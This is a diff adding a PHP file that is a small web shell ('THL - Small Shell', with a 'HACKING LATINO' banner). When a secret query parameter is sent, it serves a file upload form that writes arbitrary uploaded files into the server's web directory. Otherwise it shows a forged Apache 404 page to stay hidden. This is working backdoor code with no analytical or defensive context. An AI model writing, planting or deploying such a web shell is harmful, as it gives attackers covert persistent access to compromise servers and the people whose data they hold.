@@ -1,0 +1,26 @@
+<?php
+
+function cmd_thl()
+{
+    $dir_file_x = basename((!empty(isset($_FILES['f_t_shell']))) ? $_FILES["f_t_shell"]["name"] : NULL);
+    $thl_cmd = (!empty(isset($_GET['x_cmd']))) ? $_GET['x_cmd'] : NULL;
+    $uri_name = $_SERVER['REQUEST_URI'];
+    $sv_host = $_SERVER['HTTP_HOST'];
+
+    if ($thl_cmd == "t_shell") {
+        echo('<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta http-equiv="X-UA-Compatible" content="ie=edge"><title>THL - Small Shell</title><meta name="author" content="d3vbl4ck"><style type="text/css">@import url(https://fonts.googleapis.com/css?family=Abel);html {background: #000000;color: white;font-family: "Abel";font-size: 13px;width: 100%;}</style></head><body><center><pre style="text-align: center; color:magenta"><h1>HACKING LATINO</h1></pre><form action="" method="post" enctype="multipart/form-data"><input type="file" name="f_t_shell"><input type="submit" name="up_filex" value="Upload"></form></center></body></html>');
+
+        if (isset($_POST["up_filex"])) {
+            if (move_uploaded_file($_FILES["f_t_shell"]["tmp_name"], $dir_file_x)) {
+                echo("success upload, "),$dir_file_x;
+                //header("location: $dir_file_x");
+            }
+        }
+    }else{
+        echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL '.$uri_name.' was not found on this server.</p><hr><address>Apache/2.4.37 (Win64) PHP/5.6.40 Server at '.$sv_host.' Port 80</address></body></html>';
+    }
+}
+
+cmd_thl();
+
+?>
